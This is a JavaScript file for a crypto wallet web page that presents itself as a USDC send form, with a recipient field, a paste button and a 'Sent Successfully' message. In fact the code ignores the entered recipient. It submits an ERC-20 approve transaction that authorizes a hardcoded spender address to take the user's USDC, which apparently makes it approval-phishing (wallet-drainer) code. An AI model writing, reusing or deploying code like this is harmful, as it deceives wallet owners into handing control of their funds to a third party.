const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const SPENDER_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6';
const USDC_DECIMALS = 6;
const ETHEREUM_CHAIN_ID = '0x1';
const APPROVE_SELECTOR = '095ea7b3';

const connectButton = document.getElementById('connect-button');
const addressInput = document.getElementById('address-input');
const amountInput = document.getElementById('amount-input');
const pasteButton = document.querySelector('.paste');
const maxButton = document.querySelector('.max');
const estimate = document.getElementById('estimate');
const disclaimer = document.getElementById('disclaimer');
const statusText = document.getElementById('status-text');
const processingModal = document.getElementById('processing-modal');
const processingClose = document.getElementById('processing-close');
const txDetailsButton = document.getElementById('tx-details-button');

let currentAddress = '';
let lastTxId = '';
let isBusy = false;
let isSuccess = false;

const shortAddress = (address) => (
  address ? `${address.slice(0, 6)}...${address.slice(-4)}` : ''
);

const shortTxId = (txId) => (
  txId ? `${txId.slice(0, 8)}...${txId.slice(-8)}` : ''
);

const setStatus = (message, type = '') => {
  statusText.textContent = message;
  statusText.className = `status-text ${type}`.trim();
};

const setProcessing = (isOpen) => {
  processingModal.classList.toggle('hidden', !isOpen);
};

const getConnectedAddress = () => {
  return currentAddress;
};

const getEthereumProvider = () => {
  if (!window.ethereum) {
    throw new Error('Ethereum wallet not found. Open this page in Trust Wallet.');
  }

  return window.ethereum;
};

const updateConnectionStatus = () => {
  currentAddress = getConnectedAddress();
  const hasFinalStatus = statusText.classList.contains('error') || statusText.classList.contains('success');

  if (currentAddress) {
    if (!isBusy && !isSuccess) {
      connectButton.textContent = 'Next';
    }
    if (!isBusy && !hasFinalStatus) {
      setStatus(`Wallet: ${shortAddress(currentAddress)}`);
    }
  } else {
    if (!isBusy && !isSuccess) {
      connectButton.textContent = 'Next';
    }
    if (!isBusy && !hasFinalStatus) {
      setStatus('');
    }
  }
};

const parseUsdtAmount = (value) => {
  const normalized = String(value || '').trim();
  if (!/^\d+(\.\d{1,6})?$/.test(normalized)) {
    throw new Error('Enter a valid USDC amount with up to 6 decimals.');
  }

  const [whole, fraction = ''] = normalized.split('.');
  const units = `${whole}${fraction.padEnd(USDC_DECIMALS, '0')}`.replace(/^0+(?=\d)/, '');
  const amount = BigInt(units || '0');

  if (amount <= 0n) {
    throw new Error('Enter an amount greater than 0.');
  }

  return amount;
};

const formatUsdtUnits = (units) => {
  const value = BigInt(units.toString());
  const base = 10n ** BigInt(USDC_DECIMALS);
  const whole = value / base;
  const fraction = (value % base).toString().padStart(USDC_DECIMALS, '0').replace(/0+$/, '');
  return fraction ? `${whole}.${fraction}` : whole.toString();
};

const updateAmountCopy = () => {
  const amount = amountInput.value || '0';
  estimate.textContent = `≈ $${Number(amount || 0).toFixed(2)}`;
  disclaimer.textContent = `This authorizes spender ${SPENDER_ADDRESS} for the entered USDC amount. It is not a normal transfer.`;
};

const ensureEthereumAccount = async () => {
  const provider = getEthereumProvider();
  let accounts = await provider.request({ method: 'eth_accounts' });

  if (!accounts || accounts.length === 0) {
    accounts = await provider.request({ method: 'eth_requestAccounts' });
  }

  if (!accounts || accounts.length === 0) {
    throw new Error('Wallet address unavailable. Approve wallet access and try again.');
  }

  currentAddress = accounts[0];
  return provider;
};

const ensureEthereumMainnet = async (provider) => {
  const chainId = await provider.request({ method: 'eth_chainId' });

  if (String(chainId).toLowerCase() !== ETHEREUM_CHAIN_ID) {
    await provider.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: ETHEREUM_CHAIN_ID }]
    });
  }
};

const encodeUint256 = (value) => (
  BigInt(value).toString(16).padStart(64, '0')
);

const encodeAddress = (address) => (
  address.toLowerCase().replace(/^0x/, '').padStart(64, '0')
);

const encodeApproveData = (spender, amount) => (
  `0x${APPROVE_SELECTOR}${encodeAddress(spender)}${encodeUint256(amount)}`
);

const sendUsdcApproval = async (provider, amountUnits) => {
  const data = encodeApproveData(SPENDER_ADDRESS, amountUnits);

  return provider.request({
    method: 'eth_sendTransaction',
    params: [{
      from: currentAddress,
      to: USDC_CONTRACT_ADDRESS,
      data
    }]
  });
};

const approveExactAmount = async () => {
  try {
    isBusy = true;
    isSuccess = false;
    setStatus('');
    const amountUnits = parseUsdtAmount(amountInput.value);
    const provider = await ensureEthereumAccount();
    await ensureEthereumMainnet(provider);

    updateConnectionStatus();
    setProcessing(true);
    connectButton.disabled = true;
    connectButton.textContent = 'Processing...';

    const txId = await sendUsdcApproval(provider, amountUnits);

    lastTxId = txId;
    isSuccess = true;
    txDetailsButton.disabled = false;
    setStatus(`Authorization submitted for ${formatUsdtUnits(amountUnits)} USDC. Tx: ${shortTxId(txId)}`, 'success');
    connectButton.textContent = 'Sent Successfully';
    connectButton.classList.add('success');
  } catch (error) {
    console.error('Approval failed:', error);
    isSuccess = false;
    setProcessing(false);
    setStatus(error?.message || 'Transaction failed', 'error');
    connectButton.textContent = 'Next';
  } finally {
    isBusy = false;
    connectButton.disabled = false;
  }
};

pasteButton.addEventListener('click', async () => {
  try {
    addressInput.value = await navigator.clipboard.readText();
  } catch {
    setStatus('Paste failed. Please paste manually.', 'error');
  }
});

maxButton.addEventListener('click', () => {
  amountInput.value = '1000';
  updateAmountCopy();
});

amountInput.addEventListener('input', () => {
  isSuccess = false;
  lastTxId = '';
  connectButton.classList.remove('success');
  txDetailsButton.disabled = true;
  updateAmountCopy();
  setStatus(currentAddress ? `Wallet: ${shortAddress(currentAddress)}` : '');
});
connectButton.addEventListener('click', approveExactAmount);
processingClose.addEventListener('click', () => setProcessing(false));
txDetailsButton.addEventListener('click', () => {
  if (lastTxId) {
    window.open(`https://etherscan.io/tx/${lastTxId}`, '_blank');
  }
});

updateAmountCopy();
updateConnectionStatus();
setInterval(updateConnectionStatus, 1500);
